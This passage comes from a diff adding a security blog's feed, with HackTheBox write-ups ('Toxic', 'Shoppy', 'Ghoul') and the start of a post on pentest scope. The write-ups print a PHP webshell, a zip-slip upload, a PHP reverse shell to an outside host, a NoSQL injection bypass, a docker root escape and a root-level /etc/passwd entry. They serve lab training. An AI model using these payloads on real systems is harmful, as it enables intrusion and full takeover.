+&lt;img src=&quot;../assets/Toxic-Burp-Request.png&quot; alt=&quot;BurpSuite Request&quot; title=&quot;BurpSuite Request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We also know where the log file is because of the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx.conf&lt;/code&gt;
+When we now modify the object to load the logfile &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/nginx/access.log&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &apos;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;}%&apos; | base64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It includes the logfile and executes the code we send in the step before.&lt;/p&gt;
+
+&lt;p&gt;We get presented the acutal filename of the flag and can read the flag again with the modified object which gets unserialized.&lt;/p&gt;
+</description>
+        <pubDate>Wed, 07 Dec 2022 00:00:00 +0000</pubDate>
+        <link>//Toxic</link>
+        <link href="/Toxic"/>
+        <guid isPermaLink="true">/Toxic</guid>
+      </item>
+    
+      <item>
+        <title>Shoppy HackTheBox</title>
+        <description>&lt;h2 id=&quot;recon&quot;&gt;recon&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nmap -sC -sV -Ao nmap 10.10.11.180
+
+# Nmap 7.92 scan initiated Thu Sep 29 08:59:36 2022 as: nmap -sC -sV -Ao nmap.again 10.10.11.180
+Nmap scan report for 10.10.11.180
+Host is up (0.019s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
+|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
+|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
+80/tcp open  http    nginx 1.23.1
+|_http-server-header: nginx/1.23.1
+|_http-title: Did not follow redirect to http://shoppy.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Sep 29 09:00:05 2022 -- 1 IP address (1 host up) scanned in 29.38 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;open-ports&quot;&gt;open ports&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 = ssh&lt;/li&gt;
+  &lt;li&gt;80 = nginx http&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;enumerating-directories-and-subdomains&quot;&gt;enumerating directories and subdomains&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# find directories&lt;/span&gt;
+gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://shoppy.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+
+&lt;span class=&quot;c&quot;&gt;# find subdomains&lt;/span&gt;
+gobuster dns &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/namelist.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; shoppy.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These scans reveals that there is a login page under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shoppy.htb/login&lt;/code&gt; and asubdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mattermost&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;nosql-injection&quot;&gt;nosql injection&lt;/h2&gt;
+
+&lt;p&gt;The login site is vulnerable to nosql injection which can be exploited when submitting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&apos;||&apos;1==1&lt;/code&gt; as username.&lt;/p&gt;
+
+&lt;p&gt;By logging in we can search for users and get the hashed password. 
+We now the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; exists because we used his username in the nosql injection so we know how a positive search result looks like.&lt;/p&gt;
+
+&lt;p&gt;With this information we can look for other users with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;get-users-with-wfuzz&quot;&gt;get users with wfuzz&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/usr/share/seclists/Usernames/Names/names.txt &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt; 2561 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 500 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FU2e5ivWS313EqHejrDqmqWBOz%2B7JiK1ZGG8%2F1YJwbMqu75MRDE0GU; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FUY9maqReUKFXmGrrT34nxbATStnx0je7zCF90BWcHFlQ0UyMBoDkHwtnp1WJHOC9wgPADeoHzXw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX18zrc11pNHh3MGWXwjk8h1haEPxMCFoUas%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2BvmEdwpOw3wnRMj5AHU%2BCwhP1yuW80jog%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX18s9pN%2BNQ675PZeUnKOiPXIxXeioQcUDB8%3D; connect.sid=s%3A9xH10SZ2ZaAI3nOvgVp8GSxULBvnaDUp.e%2BkKff%2B%2BDrQhWq5D35SR4qy4jYNJraJLAzGmS9ByjEw&quot;&lt;/span&gt; http://shoppy.htb/admin/search-users&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;username&lt;span class=&quot;se&quot;&gt;\=&lt;/span&gt;FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Important here is to follow the request with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt; argument and to give it the header value with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b&lt;/code&gt; argument. 
+I was struggeling a bit with it because it always returned the same results until I tried it with curl and recognized that the request needs the cookie to success.&lt;/p&gt;
+
+&lt;p&gt;When using right the resulting users are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; which we already knew and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;josh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000000086:   200        55 L     160 W      2720 Ch     &quot;admin&quot;
+000004909:   200        55 L     160 W      2720 Ch     &quot;josh&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When clicking on “Download Export” we get an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; and a hashed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;.
+By looking at the length of the hashed password we can recognize that it is 32 chars long which can be a indication for the weak md5 hashing alogorithm.&lt;/p&gt;
+
+&lt;h2 id=&quot;cracking-found-passwords&quot;&gt;cracking found passwords&lt;/h2&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; we have to store the two hashes from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;josh&lt;/code&gt; in a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash.txt&lt;/code&gt;
+By runnig &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat hash.txt&lt;/code&gt; we can determine what kind of hash it could be and so make sure that the md5 assumption is right. 
+To crack the passwords run:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; hash.txt rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;getting-user-level&quot;&gt;getting user level&lt;/h2&gt;
+
+&lt;p&gt;So we get the password for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;josh&lt;/code&gt; which we can use for the subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mattermost&lt;/code&gt;.Here we can login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;josh&lt;/code&gt; and by looking around there are credentials for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jaeger&lt;/code&gt; which we can use to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the box and get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;By running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; we can examine which commands the user can execute.&lt;br /&gt;
+We find the executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/deploy/password-manager&lt;/code&gt; which we can run as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deploy&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; deploy /home/deploy/password-manager&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are asked about a master password which we can reverse engineer.&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-engineering-master-password&quot;&gt;reverse engineering master password&lt;/h2&gt;
+
+&lt;p&gt;By copying the executable to the loacl maschine we can inspect it with the tools we are familiar with. 
+First I tried to get the strings in it to look if the password where used in clear text in the source code.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings password-manager
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Unfortunately no success with it.&lt;/p&gt;
+
+&lt;p&gt;To continue we can use radare2 to get more information about the executable.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 password-manager
+aaa
+s main 
+VV
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the now presented callflow we can find a string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sample&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So we can authenticate in the password-manager with this master password and we get the credentials for the deploy user.&lt;/p&gt;
+
+&lt;p&gt;We can now login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deploy&lt;/code&gt; by executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su deploy&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-root&quot;&gt;getting root&lt;/h2&gt;
+
+&lt;p&gt;Still no permissions to access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; so we have to continue…&lt;/p&gt;
+
+&lt;p&gt;By looking around be can find out that we can docker without super user rights.
+So we look for docker in GTFOBins to bypass security restrictions and find &lt;a href=&quot;https://gtfobins.github.io/gtfobins/docker/&quot;&gt;this&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;To become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; we run the command explained at the bottom of the site.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /:/mnt &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; alpine &lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; /mnt sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Voila. We are root&lt;/p&gt;
+</description>
+        <pubDate>Thu, 29 Sep 2022 00:00:00 +0000</pubDate>
+        <link>//Shoppy</link>
+        <link href="/Shoppy"/>
+        <guid isPermaLink="true">/Shoppy</guid>
+      </item>
+    
+      <item>
+        <title>Ghoul HackTheBox</title>
+        <description>&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap -sC -sV -Ao nmap 10.10.10.101&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Tue Sep 27 15:23:09 2022 as: nmap -sC -sV -Ao nmap.again 10.10.10.101&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.101
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.090s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 996 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp   open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Aogiri Tree
+|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+| http-auth: 
+| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
+|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Aogiri
+|_http-title: Apache Tomcat/7.0.88 - Error report
+|_http-server-header: Apache-Coyote/1.1
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;open-ports&quot;&gt;open ports&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;port 22 = ssh&lt;/li&gt;
+  &lt;li&gt;port 80 = http website&lt;/li&gt;
+  &lt;li&gt;port 2222 = another ssh&lt;/li&gt;
+  &lt;li&gt;port 8080 = tomcat&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;enumerating-the-tomcat&quot;&gt;enumerating the tomcat&lt;/h2&gt;
+
+&lt;p&gt;Browsing to port 8080 asks for a username/password. Trying some default combinations reveals that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; is the right choice. 
+On this application you can upload images and zip files which is interesting.
+An idea is to create a zip file with a &lt;a href=&quot;https://security.snyk.io/research/zip-slip-vulnerability&quot;&gt;zip slip&lt;/a&gt; vulnerablility and upload it to the server. 
+Because there is an apache webserver you can assume it takes files from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;. 
+So you can take a php webshell like:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and zip it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip shell.zip ../../../../../../../../../var/www/html/shell.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This ensures that the zip files gets unzipped at the given directory.&lt;/p&gt;
+
+&lt;h2 id=&quot;playing-around-with-the-webshell&quot;&gt;playing around with the webshell&lt;/h2&gt;
+
+&lt;p&gt;By browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.101/shell.php&lt;/code&gt; the webserver responds with the usage guide which indicates that the webshell is working. 
+This is because we set the directory to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; which is the default directory for the apache webserver.&lt;/p&gt;
+
+&lt;p&gt;So now we can execute commands on the target system by sending them as GET parameter in the URL. 
+Testing it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.101/shell.php?cmd=cat+/etc/passwd&lt;/code&gt; reveals the passwd file.&lt;/p&gt;
+
+&lt;p&gt;To establish a reverse shell you can now set up a listener and browse to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.101/shell.php?cmd=php+-r+&apos;$sock%3dfsockopen(&quot;10.10.15.22&quot;,4000)%3bexec(&quot;/bin/sh+-i+&amp;lt;%263+&amp;gt;%263+2&amp;gt;%263&quot;)%3b&apos;&lt;/code&gt; (note the url encodeing)&lt;/p&gt;
+
+&lt;h2 id=&quot;get-user-from-www-data&quot;&gt;get user from www-data&lt;/h2&gt;
+
+&lt;p&gt;Looking around you can notice that our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; was created by root. This means that the unzip was executed with root privileges which comes in handy.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rw-r--r-- 1 root root    328 Sep 28 07:52 shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we can create a new user with root privileges by extending the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;To create a password for a new user we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl passwd AAAA&lt;/code&gt; where AAAA is the password. 
+We create a new passwd file on our local maschine with the entrys of the target and append a new user with the created password.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─ ~/HTB/Ghoul ·················································································· ✔
+╰─ wget http://10.10.10.101/shell.php\?cmd\=cat+/etc/passwd -O passwd
+--2022-09-28 14:59:27--  http://10.10.10.101/shell.php?cmd=cat+/etc/passwd
+Verbindungsaufbau zu 10.10.10.101:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1426 (1,4K) [text/html]
+Wird in »passwd« gespeichert.
+
+passwd                     100%[======================================&amp;gt;]   1,39K  --.-KB/s    in 0s
+
+2022-09-28 14:59:27 (162 MB/s) - »passwd« gespeichert [1426/1426]
+
+
+╭─ ~/HTB/Ghoul ·················································································· ✔
+╰─ echo &quot;hacker:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash&quot; &amp;gt;&amp;gt; passwd
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Get rid of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;pre&amp;gt;&lt;/code&gt; tags&lt;/li&gt;
+  &lt;li&gt;Make a backup of your current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file and move your created passwd file there&lt;/li&gt;
+  &lt;li&gt;zip the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip passwd.zip ../../../../../../../../etc/passwd&lt;/code&gt; and upload the zip created zip file&lt;/li&gt;
+  &lt;li&gt;Restore your old passwd file&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;If there are problems with your user because you aren’t part of the sudoers anymore use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; to become root&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; /etc/passwd /etc/passwd.old
+&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; ~/HTB/Ghoul/passwd /etc/passwd
+zip passwd.zip ../../../../../../../../etc/passwd
+&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; /etc/passwd.old /etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now on the target maschine you can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su hacker&lt;/code&gt; and type the created password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAA&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The user flag is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kaneki&lt;/code&gt;’s home directory&lt;/p&gt;
+</description>
+        <pubDate>Wed, 28 Sep 2022 00:00:00 +0000</pubDate>
+        <link>//Ghoul</link>
+        <link href="/Ghoul"/>
+        <guid isPermaLink="true">/Ghoul</guid>
+      </item>
+    
+      <item>
+        <title>The scope of a penetration test</title>
+        <description>&lt;h2 id=&quot;different-types-of-penetration-testing&quot;&gt;different types of penetration testing&lt;/h2&gt;
+
+&lt;p&gt;There are three types of pentests which define the initial knowledge of the attacker. White-Box, Gray-Box, Black-Box. This has consequences for the duration, costs and the finding depth of the vulnerabilities.&lt;/p&gt;
+
+&lt;h2 id=&quot;black-box-test&quot;&gt;Black-Box test&lt;/h2&gt;
+
+&lt;p&gt;In a black-box test the attacker has no knowledge about the system at all. Because of that it represents the most realistic test. The drawback of this method is that it requires the most time because the attacker has to get all the information by himself. Furthermore it is likely that a lot of vulnerabilities will be overlooked. Even though it is the most realistic method it is not really comparable with a real scenario because a real attacker has no timelimits but the pentester has.&lt;/p&gt;
+
+&lt;h2 id=&quot;white-box-test&quot;&gt;White-Box test&lt;/h2&gt;
+
+&lt;p&gt;The opposite of the black-box test is the white-box test. Here are a lot if not all information about a system provided. This includes documentation, source code, credentials and much more. This circumvents that the attacker has to invest valuable time to look for those information. However, it is the most unrealistic scenario to execute a penetration test.&lt;/p&gt;
+
+&lt;h2 id=&quot;gray-box-test&quot;&gt;Gray-Box test&lt;/h2&gt;
+
+&lt;p&gt;The hybrid model of the black-box and the white-box test is the gray-box test. There are some information like lower-level credentials or the architecture of the system provided. This saves time for looking for these low hanging information. Furthermore it represents an attack where the attacker already gathered some information about the system.&lt;/p&gt;
+
+&lt;h2 id=&quot;which-one-to-chose&quot;&gt;which one to chose?&lt;/h2&gt;
+
